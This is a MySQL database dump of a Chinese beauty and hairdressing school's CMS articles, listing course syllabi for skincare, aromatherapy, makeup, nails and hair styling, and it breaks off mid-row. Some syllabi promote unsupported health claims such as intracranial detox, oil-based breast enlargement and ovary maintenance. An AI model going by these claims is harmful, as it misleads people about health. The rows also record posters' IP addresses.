-- MySQL dump 10.13  Distrib 5.5.58, for Linux (x86_64)
--
-- Host: 10.131.0.165    Database: owuy163
-- ------------------------------------------------------
-- Server version	5.5.35.t15-log

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `dede_addonarticle`
--

DROP TABLE IF EXISTS `dede_addonarticle`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_addonarticle` (
  `aid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `typeid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `body` mediumtext,
  `redirecturl` varchar(255) NOT NULL DEFAULT '',
  `templet` varchar(30) NOT NULL DEFAULT '',
  `userip` char(15) NOT NULL DEFAULT '',
  PRIMARY KEY (`aid`),
  KEY `typeid` (`typeid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_addonarticle`
--

LOCK TABLES `dede_addonarticle` WRITE;
/*!40000 ALTER TABLE `dede_addonarticle` DISABLE KEYS */;
INSERT INTO `dede_addonarticle` VALUES (2,2,'<img alt=\"\" src=\"/uploads/190221/1-1Z2211P924246.JPG\" style=\"width: 100%;\" />','','','116.52.34.42'),(3,2,'<p><span style=\"font-size: 18px;\">学期：45--60天<br style=\"color: rgb(0, 0, 0); font-family: &#39;sans serif&#39;, tahoma, verdana, helvetica; line-height: 18px;\"/>专业护肤： 课程内容：由基础课程开始讲起，包括肌肤护理的初、中、高级全套内容。美容概述、皮肤生理学、皮肤护理学、国际通用的洗面、按摩手法。全身按摩、面部、头部、四肢按摩。各种美容仪器的保养与正确使用。皮肤的构造。各种面膜的功效与操作方法。问题性皮肤的治疗：黑头、白头、脓疮的成因与治疗方法。引起衰老皮肤、敏感皮肤、色斑皮肤的因素以及治疗方法。高级护理技巧，蜡疗美容、胶原美容、回春抗皱、抗敏修护、明眸修护、敏感红血丝、收敛毛孔、面部排毒、平衡油脂、痤疮、凹凸洞、脂溢性皮炎、毛囊炎、接解性皮炎、黄褐斑、雀斑、老年斑、痣、疣、螨病、皱纹、敏感红血丝等治疗性，问题性皮肤护理，面部刮痧美容。</span></p><p><span style=\"font-size: 18px;\"><br/></span></p><p style=\"text-align:center\"><img src=\"/uploads/allimg/20190304/1551707289761276.jpg\" title=\"1551707289761276.jpg\" alt=\"美容03.jpg\"/></p><p><br/></p><p><span style=\"font-size: 18px;\">香薰美体: 讲解各种单方精油的特征、功效、治疗方法等。精油的发展史、特性。单方精油的提炼方法及使用方法。全套时尚五感 SPA 香薰美容包括： 香薰排毒、自然疗法导论、基础辅导心理学、自然疗法市式开拓方法、植物精油的来源、SPA 水疗、卵巢保养、肾部保养、芳香疗法精油开背、淋巴排毒、冻石能量、火山齐石疗法、脂刷、全身引流排毒、阿苏裴陀疗法等全身美体美容。最新纯植物精油健胸，魔术丰胸、引流丰胸、增胸、提臀。经络腧穴理论、点穴丰胸、丰胸中医辨证分类、丰胸的治疗原理。各种丰胸方法、合理的膳食，物医辩证分类、丰胸的治疗原理。各种丰胸方法、合理的膳食，物理丰胸，日常的胸部保健，胸部的二次发育方法及先进健胸仪器的使用。</span></p>','','','219.147.98.86'),(4,2,'<p style=\"line-height: 2em;\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">&nbsp; &nbsp; 学期：六个月</span></p><p style=\"line-height: 2em;\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\"><br/></span></p><p style=\"line-height: 2em;\"><strong><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">&nbsp; &nbsp; a、专业护肤：</span></strong><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">课程内容：由基础课程开始讲起，包括肌肤护理的初、中、高级全套内容。美容概述、皮肤生理学、皮肤护理学、国际通用的洗面、按摩手法。全身按摩、面部、头部、四肢按 &nbsp; &nbsp; &nbsp; 摩。各种美容仪器的保养与正确使用。皮肤的构造。各种面膜的功效与操作方法。问题性皮肤的治疗：黑头、白头、脓疮的成因与治疗方法。引起衰老皮肤、敏感皮肤、色斑皮肤的因素以及治 &nbsp; &nbsp; &nbsp;疗方法。高级护理技巧，蜡疗美容、胶原美容、回春抗皱、抗敏修护、明眸修护、敏感红血丝、收敛毛孔、面部排毒、平衡油脂、痤疮、凹凸洞、脂溢性皮炎、毛囊炎、接解性皮炎、黄褐斑、 &nbsp; &nbsp; 雀斑、老年斑、痣、疣、螨病、皱纹、敏感红血丝等治疗性，问题性皮肤护理，面部刮痧美容。<br style=\"color: rgb(0, 0, 0); font-family: &#39;sans serif&#39;, tahoma, verdana, helvetica; line-height: 18px;\"/><br style=\"color: rgb(0, 0, 0); font-family: &#39;sans serif&#39;, tahoma, verdana, helvetica; line-height: 18px;\"/>&nbsp; &nbsp; b<strong>、香薰美体：</strong>讲解各种单方精油的特征、功效、治疗方法等。精油的发展史、特性。单方精油的提炼方法及使用方法。全套时尚五感 SPA 香薰美容包括： 香薰排毒、自然疗法导论、基础辅导心理学、自然疗法市式开拓方法、植物精油的来源、SPA 水疗、卵巢保养、肾部保养、芳香疗法精油开背、淋巴排毒、冻石能量、火山齐石疗法、脂刷、全身引流排毒、阿苏裴陀疗法等全身美体美容。最新纯植物精油健胸，魔术丰胸、引流丰胸、增胸、提臀。经络腧穴理论、点穴丰胸、丰胸中医辨证分类、丰胸的治疗原理。各种丰胸方法、合理的膳食，物医辩证分类、丰胸的治疗原理。各种丰胸方法、合理的膳食，物理丰胸，日常的胸部保健，胸部的二次发育方法及先进健胸仪器的使用。</span></p><p style=\"line-height: 2em;\"><span style=\"font-size: 16px;\"><span style=\"font-family:微软雅黑, Microsoft YaHei\"><br/></span></span></p><p style=\"line-height: 2em;\"><span style=\"font-size: 16px;\"></span></p><p style=\"text-align: center; line-height: 2em;\"><span style=\"font-family:微软雅黑, Microsoft YaHei\"><img src=\"/uploads/allimg/20190304/1551705624472336.jpg\" title=\"1551705624472336.jpg\" alt=\"美容00.jpg\"/></span></p><p style=\"line-height: 2em;\"><span style=\"font-family:微软雅黑, Microsoft YaHei\"><br/></span></p><p style=\"line-height: 2em;\"><strong><span style=\"font-size: 16px;\"><span style=\"font-family:微软雅黑, Microsoft YaHei\">&nbsp; &nbsp; &nbsp;c、美容师化妆：</span></span></strong><span style=\"font-size: 16px;\"><span style=\"font-family:微软雅黑, Microsoft YaHei\"> 化妆品真伪与品质的识别、化妆工具的认识与使用，化妆发展史，人体骨骼的分布，肌肉走向，不同年龄段的五官协调化妆法则，整体妆型的认识，人体五官的修饰，气质的塑造及各种妆型的化妆技巧、色彩认识与搭配。从素描开始讲起，包括基点、基面化妆技巧、裸妆、生活妆、职业妆、白领妆、当天新娘、晚宴妆等整体化妆造型。</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;sans serif&#39;, tahoma, verdana, helvetica; line-height: 18px;\"/><br style=\"color: rgb(0, 0, 0); font-family: &#39;sans serif&#39;, tahoma, verdana, helvetica; line-height: 18px;\"/><span style=\"font-family:微软雅黑, Microsoft YaHei\">&nbsp; &nbsp; <strong>d、专业养生： </strong>养生美容班包括中医美容治疗班课程中医养生调理班内容：中医理论知识，中医基础学、十二经络学、中医五行学、藏像学说。通过望、闻、问、切发现亚健康状况及调理。全身排毒及推油、面部刮痧及身体部位刮痧、身心调试保健、耳烛、颅内排毒、拔罐、中医保健、卵巢保养、肾部保养、温灸、脐疗、冷热石疗。亚健康的扶正结合祛除各种问题性皮肤。</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;sans serif&#39;, tahoma, verdana, helvetica; line-height: 18px;\"/><br style=\"color: rgb(0, 0, 0); font-family: &#39;sans serif&#39;, tahoma, verdana, helvetica; line-height: 18px;\"/><span style=\"font-family:微软雅黑, Microsoft YaHei\">&nbsp; &nbsp; &nbsp;<strong>e、专业美甲全能：</strong>讲授国际最新美甲造型艺术，指甲形状和手型的搭配，春夏秋冬的色彩设计，指甲油和顾客肤色的设计，全面解说美手、美足及各种美甲艺术造型实例、各种工具的使用、修甲的技巧、指甲上油、画花、贴花、色彩拓印、贴片甲、法式甲、水晶甲、丝绸甲、镶嵌甲、梦幻甲、新娘甲的设计制作，各式彩绘甲琉璃甲三维立体画花雕花甲内雕外雕浮雕 3D 艺术彩绘甲、3D 立体雕花，蕾丝甲、贝壳粉甲、光疗树脂甲、法式甲、美甲手绘艺术、时尚光疗和琉璃甲，水立方，蔻丹，韩国彩绘，QQ 甲和面雕、蛇皮甲等现今艺术美甲造型。</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;sans serif&#39;, tahoma, verdana, helvetica; line-height: 18px;\"/></span><br/></p>','','','219.147.98.86'),(65,17,'<p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">互联网的兴起让现在的教育变得越来越简单，也拓宽了教育的渠道，网上授课成为风靡于学生之间的时尚，同时学习化妆培训课程也成为大家感兴趣的话题，而对于爱美，欣赏美，善于捕捉美的人，选择化妆师的职业不失为一个合适的选择。<br/></span></p><p style=\"text-align:center\"><img src=\"/uploads/allimg/20190303/1551607952195492.jpg\" title=\"1551607952195492.jpg\" alt=\"1 (3).jpg\"/></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">化妆在以前只是一个休闲娱乐的方式，在古代也只有在人生重要的场合才会用到这一技术，而且也几乎没有专业的从业人士，但是自从欧美国家流行以来，化妆技术的魅力开始被大家熟知，尤其对于很多对外貌身材要求比较高的职业，比如影视明星，话剧演员等都离不开化妆师的帮忙，毕竟即使美如明星，也不会没有一点面容上的瑕疵，而那些能让五官更加立体的魔力，只有化妆师才能带来。</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">在这样的趋势下，不管是业余的美妆达人，还是专业的化妆师，都成为当代青年择业的香饽饽，不管是作为当红小花或流量小生的专业化妆团队，还是在喜结良缘，面试就业等人生的十字路口，都真的需要学习化妆培训课程，想象一下，如果在热闹的婚礼上，宣读誓言时发现新娘的妆都花了，婚礼录像也全程记录下来了，毫不夸张地说，这样的化妆技术可以说是亟待加强。<br/></span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">&nbsp;</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">而如何提高化妆水平是一个需要长期训练的东西，不是一朝一夕就可以养成的，而且如果不经过化妆老师的专业指导和经验传授，自己闷头学出来的效果往往差强人意。而梵希教育这样的职业技术学校以极好的口碑在业界树立了很好的榜样，通过看它对化妆技术方面的研究不难看出，它的团队是真正的敬业和负责的典范，而学习一项技术就有意味着有一门傍身的手艺，走到哪里都不会发愁，更何况化妆师是一个薪资和待遇都很好的职业，更是炙手可热。</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">所以怎么判断自己真的需要学习化妆培训课程呢？一是看自己对于未来职业的规划，是否从事与化妆相关的行业；另一方面是看自己的妆容是不是足够令人满意，可以在社交场合中展现非凡的美，具体来看就是检查化妆的步骤，还有存不存在卡粉，粉不均匀，假面，苍白无神等各方面的问题，通过参加梵希化妆培训学校的培训课，一一得到解决。当然如果单纯的为了培养兴趣爱好，学习化妆也是一个有意思的选择。</span></p><p><br/></p>','','','219.147.98.86'),(5,2,'<p><span style=\"font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\">学期：四个月<br style=\"color: rgb(0, 0, 0); font-family: &#39;sans serif&#39;, tahoma, verdana, helvetica; line-height: 18px;\"/>专业护肤： 课程内容：由基础课程开始讲起，包括肌肤护理的初、中、高级全套内容。美容概述、皮肤生理学、皮肤护理学、国际通用的洗面、按摩手法。全身按摩、面部、头部、四肢按摩。各种美容仪器的保养与正确使用。皮肤的构造。各种面膜的功效与操作方法。问题性皮肤的治疗：黑头、白头、脓疮的成因与治疗方法。引起衰老皮肤、敏感皮肤、色斑皮肤的因素以及治疗方法。高级护理技巧，蜡疗美容、胶原美容、回春抗皱、抗敏修护、明眸修护、敏感红血丝、收敛毛孔、面部排毒、平衡油脂、痤疮、凹凸洞、脂溢性皮炎、毛囊炎、接解性皮炎、黄褐斑、雀斑、老年斑、痣、疣、螨病、皱纹、敏感红血丝等治疗性，问题性皮肤护理，面部刮痧美容。<br style=\"color: rgb(0, 0, 0); font-family: &#39;sans serif&#39;, tahoma, verdana, helvetica; line-height: 18px;\"/><br/></span></p><p style=\"text-align:center\"><img src=\"/uploads/allimg/20190304/1551707036133711.jpg\" title=\"1551707036133711.jpg\" alt=\"美容01.jpg\"/></p><p><br/></p><p><span style=\"font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\">香薰美体: 讲解各种单方精油的特征、功效、治疗方法等。精油的发展史、特性。单方精油的提炼方法及使用方法。全套时尚五感 SPA 香薰美容包括： 香薰排毒、自然疗法导论、基础辅导心理学、自然疗法市式开拓方法、植物精油的来源、SPA 水疗、卵巢保养、肾部保养、芳香疗法精油开背、淋巴排毒、冻石能量、火山齐石疗法、脂刷、全身引流排毒、阿苏裴陀疗法等全身美体美容。最新纯植物精油健胸，魔术丰胸、引流丰胸、增胸、提臀。经络腧穴理论、点穴丰胸、丰胸中医辨证分类、丰胸的治疗原理。各种丰胸方法、合理的膳食，物医辩证分类、丰胸的治疗原理。各种丰胸方法、合理的膳食，物理丰胸，日常的胸部保健，胸部的二次发育方法及先进健胸仪器的使用。<br style=\"color: rgb(0, 0, 0); font-family: &#39;sans serif&#39;, tahoma, verdana, helvetica; line-height: 18px;\"/><br style=\"color: rgb(0, 0, 0); font-family: &#39;sans serif&#39;, tahoma, verdana, helvetica; line-height: 18px;\"/>生活美甲： 讲授国际最新美甲造型艺术，全面解说美手、美足及各种美甲艺术造型实例、各种工具的使用、修甲的技巧、指甲上油、基础护理、画花、贴花、色彩拓印、贴片甲、法式甲、水晶甲、雕花、丝绸甲、法式光疗、镶嵌甲、梦幻甲、彩胶渐变、半贴彩胶渐变、新娘甲的设计制作等。</span></p><p><span style=\"font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\"><br/></span></p><p><span style=\"font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\"></span></p><p style=\"text-align:center\"><img src=\"/uploads/allimg/20190304/1551707059174388.jpg\" title=\"1551707059174388.jpg\" alt=\"美容02.jpg\"/></p><p><br/></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">生活纹绣： 讲授初中高级全套纹刺课程。真人实操，纹刺发展史，纹刺工具，用品，产品介绍及使用。纹绣成本的核算标准，收费标准。眉、眼、唇、鼻及面部的五官协调法则及设计。根据人体五官运势纹绣，不同皮肤性质的纹刺调色原理、不同血型人群的不同配色，根据年龄，生理周期的着色原理，眉型、唇型的设计、面部纹绣技术、柔仿绣绘艺术。<br style=\"color: rgb(0, 0, 0); font-family: &#39;sans serif&#39;, tahoma, verdana, helvetica; line-height: 18px;\"/><br style=\"color: rgb(0, 0, 0); font-family: &#39;sans serif&#39;, tahoma, verdana, helvetica; line-height: 18px;\"/>美容师化妆： 化妆品真伪与品质的识别、化妆工具的认识与使用，化妆发展史，人体骨骼的分布，肌肉走向，不同年龄段的五官协调化妆法则，整体妆型的认识，人体五官的修饰，气质的塑造及各种妆型的化妆技巧、色彩认识与搭配。从素描开始讲起，包括基点、基面化妆技巧、裸妆、生活妆、职业妆、白领妆、当天新娘、晚宴妆等整体化妆造型。</span><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\"><span style=\"font-size: 18px; font-family: &#39;comic sans ms&#39;;\"></span><span style=\"font-family: &#39;comic sans ms&#39;; font-size: 18px;\"><span style=\"font-family: 宋体, SimSun; font-size: 20px;\"></span><span style=\"font-size: 16px; font-family: 宋体, SimSun;\"><br/></span></span></span></p>','','','219.147.98.86'),(6,8,'<p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 0, 0); line-height: 18px;\">学期时长四个月</span></span></p><p><span style=\"font-size: 18px;\"><span style=\"font-family:微软雅黑, Microsoft YaHei\"><br style=\"color: rgb(0, 0, 0); line-height: 18px;\"/></span><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 0, 0); line-height: 18px;\">专业美发班：发廊的全套服务流程。服务礼仪、交流技巧、服务细节、洗发课程，躺洗、水洗、干洗、泰式洗发、台湾三温暖洗发。头部及肩、颈、背等半身按摩课程。从最基础的头发结构，头发养护、调理以及造成头发受损的原因开设讲起，包括头发护理、倒膜、水疗、冰疗焗油、头发肥料、精发素导入等专业护理课程。所有男发、老年式发型、基础烫发、染发、离子烫等课程男士基础形，平头、板寸、毛寸、酷哥头、及日韩时尚造型等男士发型的精剪技巧</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;sans serif&#39;, tahoma, verdana, helvetica; line-height: 18px;\"/><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 0, 0); line-height: 18px;\">女发造型班：女士剪发高级裁剪全部内容。专业分区手法，提拉角度，切口等专业手法，标准发型师的站姿站位，气质锻炼，电推剪的操作使用操作要领。专业剪发手法：雕剪、刻痕剪、飞剪、倒滑剪、断剪、等操作要领及运用方法。高、低层次、综合层次、重量堆积、重量去除等修剪方式，轮廓修剪定律及公式，技术运用等，</span></span></p><p><span style=\"font-size: 18px;\"><span style=\"font-family:微软雅黑, Microsoft YaHei\"><br/></span></span></p><p style=\"text-align:center\"><span style=\"font-size: 18px;\"><span style=\"font-family:微软雅黑, Microsoft YaHei\"><img src=\"/uploads/allimg/20190304/1551708153440806.jpg\" title=\"1551708153440806.jpg\" alt=\"美发04.jpg\"/></span></span></p><p><span style=\"font-size: 18px;\"><span style=\"font-family:微软雅黑, Microsoft YaHei\"><br style=\"color: rgb(0, 0, 0); line-height: 18px;\"/></span><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 0, 0); line-height: 18px;\">精剪烫染班（美发进修课程）</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;sans serif&#39;, tahoma, verdana, helvetica; line-height: 18px;\"/><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 0, 0); line-height: 18px;\">a、时尚精剪班：专业讲授女士发型精剪课程，诠释 Vidal Sass~）On 沙宣裁剪技术的核心理念，全面科学系统地掌握沙宣的三大技术，Onehenqht Graduatrn Layen 方、园、三角以及动力学运用，以典雅细腻的剪裁，复活经典剪裁的立体几何线条，让沙宣勇于探索的理念，从而达到提升自身的技术和商业效益，同时掌握托尼盖科学的剪发理念及基本型剪裁，科学的分区及分线，训练剪发的控制力，站姿，手位等，科学的灵活运用 TONI&amp;GI--IYI2 款金典发型，各种女士发型层次及层次组合，深度挖掘审美观及女士发型的修剪技巧。德国修剪定律，质感短发、BOBO发型、日本二分区修剪，韩式等各种对称与不对称、连接与不连接的层次设计，讲授发型对发质的修饰及众多刘海的修剪技巧，并对每款发型进行全方位的立体造型设计。</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;sans serif&#39;, tahoma, verdana, helvetica; line-height: 18px;\"/><br style=\"color: rgb(0, 0, 0); font-family: &#39;sans serif&#39;, tahoma, verdana, helvetica; line-height: 18px;\"/><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 0, 0); line-height: 18px;\">b、吹风造型班： 传授全套的吹风技巧，各式梳子，凹形电夹板，波纹电夹板、电卷棒的使用方法。吹风造型与发质剪裁技术，吹风造型角度与吹风造型的关系，经典的直线曲线波纹纹理及沙宣几何形态的吹风造型。各种梳子的使用技巧以及徒手造型等。发饰产品打理造型技巧，认识形体，电夹板、电卷棒造型技巧，纹理、大卷、内扣、飞机头、一字、梨花、垂直螺旋大卷等。针对各种脸型、发质、发长和顾客的气质挖掘顾客的美等各式吹风造型技巧，超动感、线条等，各种女士以及日韩男士时尚造型等技巧造型并结合欧美现代造型艺术，让我们的技术更尖端化。</span></span></p><p><span style=\"font-size: 18px;\"><span style=\"font-family:微软雅黑, Microsoft YaHei\"><br/></span></span></p><p><span style=\"font-size: 18px;\"></span></p><p style=\"text-align:center\"><span style=\"font-family:微软雅黑, Microsoft YaHei\"><img src=\"/uploads/allimg/20190304/1551708166739129.jpg\" title=\"1551708166739129.jpg\" alt=\"美发06.jpg\"/></span></p><p><span style=\"font-family:微软雅黑, Microsoft YaHei\"><br/></span></p><p><span style=\"font-size: 18px;\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 0, 0); line-height: 18px;\">C、时尚烫染： 让你从基础的对色彩、色相、色度、色调、亮度、纯度、彩度的变化，色板识别、色彩搭配。叠染、透染、转染、断然、色中色、渐变色、对冲色等。全方位诠释冷烫与热烫的区别，热烫的原理、热烫的方法及效果等涵盖了日韩商业造型烫；潮流长发造型；潮流烫发；商业组和烫；不连接前卫中长发时尚烫；时尚纹理烫；商业蓬松烫；新概念烫发；SPA 热能烫；空气灵感烫绒绳烫；香薰烫、火焰烫、波感烫，理疗弹性烫等。三维立体烫等多项烫发技术。更有流行日式梨花剪烫、水泼纹等潮流商业造型讲解，及烫前烫后护理技术，百变风格系多款个性化精髓演绎。</span></span><br/></p><p><span style=\"font-size: 18px;\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 0, 0); line-height: 18px;\"><br/></span></span></p><p><span style=\"font-size: 18px;\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 0, 0); line-height: 18px;\"><br/></span></span></p>','','','223.72.36.106'),(7,8,'<p><span style=\"font-size: 20px;\">学期：45--60天</span></p><p><span style=\"font-size: 20px;\"><br style=\"color: rgb(0, 0, 0);\"/>专业美发班：发廊的全套服务流程。服务礼仪、交流技巧、服务细节、洗发课程，躺洗、水洗、干洗、泰式洗发、台湾三温暖洗发。头部及肩、颈、背等半身按摩课程。从最基础的头发结构，头发养护、调理以及造成头发受损的原因开设讲起，包括头发护理、倒膜、水疗、冰疗焗油、头发肥料、精发素导入等专业护理课程。所有男发、老年式发型、基础烫发、染发、离子烫等课程男士基础形，平头、板寸、毛寸、酷哥头、及日韩时尚造型等男士发型的精剪技巧。</span></p><p><span style=\"font-size: 20px;\"><br/></span></p><p style=\"text-align:center\"><span style=\"font-size: 20px;\"><img src=\"/uploads/allimg/20190304/1551707751104250.jpg\" title=\"1551707751104250.jpg\" alt=\"美发05.jpg\"/></span></p><p><span style=\"font-size: 20px;\"><br style=\"color: rgb(0, 0, 0);\"/>女发造型班：女士剪发高级裁剪全部内容。专业分区手法，提拉角度，切口等专业手法，标准发型师的站姿站位，气质锻炼，电推剪的操作使用操作要领。专业剪发手法：雕剪、刻痕剪、飞剪、倒滑剪、断剪、等操作要领及运用方法。高、低层次、综合层次、重量堆积、重量去除等修剪方式，轮廓修剪定律及公式，技术运用等，<br style=\"color: rgb(0, 0, 0); font-family: &#39;sans serif&#39;, tahoma, verdana, helvetica; line-height: 18px;\"/>精剪烫染班（美发进修课程）</span></p><p style=\"text-align:center\"><img src=\"/uploads/allimg/20190304/1551707731435028.jpg\" title=\"1551707731435028.jpg\" alt=\"美发00.jpg\"/></p><p><br/></p><p><span style=\"font-size: 20px;\">时尚精剪班：专业讲授女士发型精剪课程，诠释Vidal Sass~）On沙宣裁剪技术的核心理念，全面科学系统地掌握沙宣的三大技术，Onehenqht Graduatrn Layen方、园、三角以及动力学运用，以典雅细腻的剪裁，复活经典剪裁的立体几何线条，让沙宣勇于探索的理念，从而达到提升自身的技术和商业效益，同时掌握托尼盖科学的剪发理念及基本型剪裁，科学的分区及分线，训练剪发的控制力，站姿，手位等，科学的灵活运用TONI&amp;GI--IYI2款金典发型，各种女士发型层次及层次组合，深度挖掘审美观及女士发型的修剪技巧。德国修剪定律，质感短发、BOBO发型、日本二分区修剪，韩式等各种对称与不对称、连接与不连接的层次设计，讲授发型对发质的修饰及众多刘海的修剪技巧，并对每款发型进行全方位的立体造型设计。&nbsp;</span><br/></p>','','','219.147.98.86'),(8,8,'<p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">学期：六个月<br style=\"color: rgb(0, 0, 0); font-family: &#39;sans serif&#39;, tahoma, verdana, helvetica; line-height: 18px;\"/>专业美发班：发廊的全套服务流程。服务礼仪、交流技巧、服务细节、洗发课程，躺洗、水洗、干洗、泰式洗发、台湾三温暖洗发。头部及肩、颈、背等半身按摩课程。从最基础的头发结构，头发养护、调理以及造成头发受损的原因开设讲起，包括头发护理、倒膜、水疗、冰疗焗油、头发肥料、精发素导入等专业护理课程。所有男发、老年式发型、基础烫发、染发、离子烫等课程男士基础形，平头、板寸、毛寸、酷哥头、及日韩时尚造型等男士发型的精剪技巧。<br style=\"color: rgb(0, 0, 0); font-family: &#39;sans serif&#39;, tahoma, verdana, helvetica; line-height: 18px;\"/><br style=\"color: rgb(0, 0, 0); font-family: &#39;sans serif&#39;, tahoma, verdana, helvetica; line-height: 18px;\"/>女发造型班：女士剪发高级裁剪全部内容。专业分区手法，提拉角度，切口等专业手法，标准发型师的站姿站位，气质锻炼，电推剪的操作使用操作要领。专业剪发手法：雕剪、刻痕剪、飞剪、倒滑剪、断剪、等操作要领及运用方法。高、低层次、综合层次、重量堆积、重量去除等修剪方式，轮廓修剪定律及公式，技术运用等，<br style=\"color: rgb(0, 0, 0); font-family: &#39;sans serif&#39;, tahoma, verdana, helvetica; line-height: 18px;\"/><br/></span></p><p style=\"text-align:center\"><img src=\"/uploads/allimg/20190304/1551707641635885.jpg\" title=\"1551707641635885.jpg\" alt=\"美发01.jpg\" style=\"text-align: center;\"/></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\"><br style=\"color: rgb(0, 0, 0); font-family: &#39;sans serif&#39;, tahoma, verdana, helvetica; line-height: 18px;\"/>精剪烫染班（美发进修课程）</span><br/></p><p><br/></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">a、时尚精剪班：专业讲授女士发型精剪课程，诠释 Vidal Sass~）On 沙宣裁剪技术的核心理念，全面科学系统地掌握沙宣的三大技术，Onehenqht Graduatrn Layen 方、园、三角以及动力学运用，以典雅细腻的剪裁，复活经典剪裁的立体几何线条，让沙宣勇于探索的理念，从而达到提升自身的技术和商业效益，同时掌握托尼盖科学的剪发理念及基本型剪裁，科学的分区及分线，训练剪发的控制力，站姿，手位等，科学的灵活运用 TONI&amp;GI--IYI2 款金典发型，各种女士发型层次及层次组合，深度挖掘审美观及女士发型的修剪技巧。德国修剪定律，质感短发、BOBO发型、日本二分区修剪，韩式等各种对称与不对称、连接与不连接的层次设计，讲授发型对发质的修饰及众多刘海的修剪技巧，并对每款发型进行全方位的立体造型设计。<br style=\"color: rgb(0, 0, 0); font-family: &#39;sans serif&#39;, tahoma, verdana, helvetica; line-height: 18px;\"/><br style=\"color: rgb(0, 0, 0); font-family: &#39;sans serif&#39;, tahoma, verdana, helvetica; line-height: 18px;\"/>b、吹风造型班： 传授全套的吹风技巧，各式梳子，凹形电夹板，波纹电夹板、电卷棒的使用方法。吹风造型与发质剪裁技术，吹风造型角度与吹风造型的关系，经典的直线曲线波纹纹理及沙宣几何形态的吹风造型。各种梳子的使用技巧以及徒手造型等。发饰产品打理造型技巧，认识形体，电夹板、电卷棒造型技巧，纹理、大卷、内扣、飞机头、一字、梨花、垂直螺旋大卷等。针对各种脸型、发质、发长和顾客的气质挖掘顾客的美等各式吹风造型技巧，超动感、线条等，各种女士以及日韩男士时尚造型等技巧造型并结合欧美现代造型艺术，让我们的技术更尖端化。<br style=\"color: rgb(0, 0, 0); font-family: &#39;sans serif&#39;, tahoma, verdana, helvetica; line-height: 18px;\"/><br style=\"color: rgb(0, 0, 0); font-family: &#39;sans serif&#39;, tahoma, verdana, helvetica; line-height: 18px;\"/>C、时尚烫染： 让你从基础的对色彩、色相、色度、色调、亮度、纯度、彩度的变化，色板识别、色彩搭配。叠染、透染、转染、断然、色中色、渐变色、对冲色等。全方位诠释冷烫与热烫的区别，热烫的原理、热烫的方法及效果等涵盖了日韩商业造型烫；潮流长发造型；潮流烫发；商业组和烫；不连接前卫中长发时尚烫；时尚纹理烫；商业蓬松烫；新概念烫发；SPA 